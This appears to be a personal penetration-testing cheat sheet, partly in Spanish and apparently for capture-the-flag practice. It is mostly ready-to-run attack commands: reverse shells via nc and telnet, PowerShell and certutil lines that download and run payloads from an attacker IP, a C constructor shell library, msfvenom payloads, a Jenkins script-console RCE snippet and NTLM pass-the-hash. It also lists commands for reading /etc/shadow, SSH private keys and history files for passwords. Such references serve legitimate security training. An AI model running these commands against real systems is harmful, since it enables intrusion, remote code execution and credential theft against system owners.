##OS Discovery##
ping -c x.x.x.x
Linux/unix TTL 64
Wndows TTL 128
Solaris/AIX 254
whatweb http://x.x.x.x

## NMAP ##
nmap -p- --open -T5 -n -v X.X.X.X -oN nmap_full
nmap -p- -sS --min-rate 5000 -vvv -n --open -T5 -Pn X.X.X.X -oN nmap_full --> Mas rapido
nmap -sC -sV -p21,22,80,443,8080 X.X.X.X -oN nmap_detailled
nmap --script http-enum -p80 X.X.X.X -oN ScanWeb
nmap --script http-enum.nse -p80 --script-args http-enum.basepath="dev/" X.X.X.X -oN ScanWebPath

##WEB FUZZING##
wfuzz -c --hc=404 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://x.x.x.x/FUZZ.FUZZ
wfuzz -c --hc=404 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w diccionario2.txt http://x.x.x.x/FUZZ.FUZ2Z


##REVERSE SHELL##
nohup nc -e /bin/bash X.X.X.X 1234 & --> shell con proceso independiente
https://gtfobins.github.io
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX()New-Object Net.WebClient)downloadString('http://MI_IP/script.ps1')) --> mejorar shell
C shell:
----------------------------------------
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("REVERSE_SHELL");}
---------------------------------------
gcc -shared -o exploit.so -fPIC exploit.c


##UPGRADE SHELL1##
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py

##UPGRADE SHELL2##
script /dev/null -c bash
control+z
stty raw -echo
fg
reset
export term=XTERM
export SHELL=bash
stty -a --> correr localmente para ver proporciones de ventana
stty rows 44 colums 187

##TIPS##
wesng o exploit-suggester tool --> para recon windows manual basada en systeminfo
dos2unix --> comando para compatibilidad de bash script en diferentes OS
Cuando hay un valor dentrod e doble comilla en bash, colocar luego todo dentro de triple comilla
chmod 4755 /bin/bash --> otorga permisos temporales de root a /bin/bash

##s4vitar commands##
find /-name user.txt 2>/dev/null --> muestra ubicacion de archivo user.txt
find /-type f 2>/dev/null  ##listar archivos con privilegios
sudo -l  ##listar comandos sudos sin pass
sudo -u usuario_priv bash--> ejecutar comandos o tener consola con un usuario permitido sin pass usar previo sudo -l
uid  ## ver privilegios
find /-perm -4000 2>/dev/null  ##listar archivos con permisos suid
find /-user user_priv 2>/dev/null --> recursos donde ese usuario sea propietario

##RECON PRIVESC##
PowerUp.ps1 --> all-checks para windows
uname -a --> ver version de kernel
id ## ver grupos
sudo -l ## ver comandos que se pueden ejecutar como root sin pass
find \-perm -4000 2>/dev/null  ##listar archivos con permisos suid

##SMB##
smbmap -H X.X.X.X --> Scanea directorios y permisos
smbclient //X.X.X.X/tmp
smbclient //X.X.X.X/tmp --option='client min protocol=NT1'--> Fix problemas de incompatibilidad de version en cliente
smbclient //X.X.X.X/tmp -N --> parametro -N conecta como anonymous
mount -t cifs //X.X.X.X/remotefolder /mnt/mountfolder -o username=null, password=null,domain=WORKGROUP,rw. --> montar carpeta localmente


##Download/upload HTTP##
-Cliente-
New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\X.X.X.X\Folder
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.55:8000/exploit.exe', 'C:\users\ususario\Desktop\exploit.exe')"
powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.x:xxx/powershell_attack.ps1')"
certutil.exe -f -urlcache -split http://X.X.X.X:8000/exploit.exe exploit.exe
-Server-
impacket-smbserver smbFolder FOLDER
Python -m SimpleHTTPServer
Python3 -m http.server
Python -m pyftpdlib -p 21 -w
Python3 -m pyftpdlib -p 21 -w

##MSVENON PAYLOAD##
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe > arctic.exe

##FUZZ##
wfuzz -c -w ../../../tools/SecLists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://xx.xx.xx.xx:xxx/FUZZ.FUZ2Z --hc 404,403 -t 100
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t xx.xx.xx.xx
wfuzz -c -w /home/kali/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403,301 -H "Host: FUZZ.academy.htb" -u http://academy.com -t 100
nikto
dirsearch
ffuf

##VULN Jenkins script##
consola jenkins
cmd = """ powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.xx:8000/Invoke-PowerShellTcp.ps1')" """
println cmd.execute().text

##Shared attacker - victim##
attacker: sudo impacket-smbserver share `pwd`
victim: net use z: \\xx.xx.xx.xx\share

##LOCAL BRUTE FORCE##
sudo john --wordlist=/usr/share/wordlists/rockyou.txt file.hash

##REMOTE BRUTE FORCE##
Hydra
Medusa

##WORDLIST GENERATOR##
CEWL
CRUNCH

##WORDLIST##
/usr/share/wordlists --> DEFAULT KALI
Seclist

##ONLINE PASS CRACKING##
https://hashkiller.io
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://passwordrecovery.io/
http://cracker.offensive-security.com/


##Get CMD Administrator with Hash NTLM##
pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //xx.xx.xx.xx cmd

##show stream de directorios##
dir/R

##Read stream with powershell##
powershell Get-Content -Path "file.txt" -Stream "root.txt"

##Take Advance Auto Login windows to privesc##
SecPass = ConvertTo-SecureString 'FoundPass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)â€‹
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.xx:xxx/Invoke2-PowerShellTcp_Adminreverseshell.ps1')" -Credential $cred

##Tunneling##
NETCAT --> nc.exe -e cmd.exe xx.xx.xx.xx xxx
SSH --> plink.exe -l kali -pw kali 10.10.14.20 -R 8888:127.0.0.1:8888

##TIPS##
Invoke --> Reverse Shell powershell
Sherlock --> Check all vulns with "Find-AllVulns"

##BoF##
Create string with a specific long(2700) --> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
reverse shell for BoF without invalid characters --> msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=xxx -a x86 --platform windows -b "\0x00\x0A\x0D" -e x86/shikata_ga_nai -f c

##Windows Recon##
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 hostname
 echo %username%
 net users
 ipconfig /all
 route print
 arp -A
 netstat -ano
 netsh firewall show state
 netsh firewall show config
 schtasks /query /fo LIST /v
 tasklist /SVC
 net start
 DRIVERQUERY
 wmic /? <---- Usefull Comand line windows
 wmic qfe get Caption,Description,HotFixID,InstalledOn

##Linux Recon##
DISTRO VERSION
cat /etc/issue
cat /etc/*-release
  cat /etc/lsb-release      # Debian based
  cat /etc/redhat-release   # Redhat based
KERNEL VERSION
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
ENVIROMENT VARIABLES
at /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
PRINTERS?
lpstat -a
APPS&SERVICES
ps aux
ps -ef
top
cat /etc/services
SERVICES RUNNING BY ROOT
ps aux | grep root
ps -ef | grep root
APP INSTALLED,VERSION,RUNNING
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
VULNERABLE CONFIG
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
SCHEDULED JOBS
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
USER/PASS PLAIN TEXT
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
NICS CONNECTED
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
NETWORK INFO(DHCP, DNS, ETC)
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
USER/HOST COMMUNICATED WITH THE SYSTEM
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
IP/MAC IN CACHE
arp -e
route
/sbin/route -nee
SNIFFING TRAFFIC
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
GET SHELL
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
TUNNELING
http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]

ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)

##CONFIDENTIAL INFORMATION##
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

##SENSITIVE FILES##
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

##INTERESTING DIRECTORIES##
1
2
ls -ahlR /root/
ls -ahlR /home/

##PASSWORD IN SCRIPT, DB, ETC##
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

##PASSWORD PLAIN TEXT##
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

##USER INFORMATION##
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root

##PRIVATE KEY INFORMATION##
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

##INFO IN VAR##
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

##HIDDEN FILES IN WEBSITE##
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/

##LOGS FILES##
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/

##JAIL SCAPE##
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i

##SHOW MOUNTED FILES##
cat /etc/fstab

##FILES PERMISSIONS##
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

##WRITE PERMISSIONS#
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders

find / -perm -o x -type d 2>/dev/null     # world-executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

##LANGUAGE INSTALLED##
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc

##UPLOAD FILES METHOD POSSIBLE##
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp

##Common Windows Privilege Escalation Vectors##
Stored Credentials
Windows Kernel Exploit
DLL Injection
Unattended Answer File
Insecure File/Folder Permissions
Insecure Service Permissions
DLL Hijacking
Group Policy Preferences
Unquoted Service Path
Always Install Elevated
Token Manipulation
Insecure Registry Permissions
Autologon User Credential
User Account Control (UAC) Bypass
Insecure Named Pipes Permissions


https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory
https://blog.gdssecurity.com/labs/2018/7/11/cups-local-privilege-escalation-and-sandbox-escapes.html
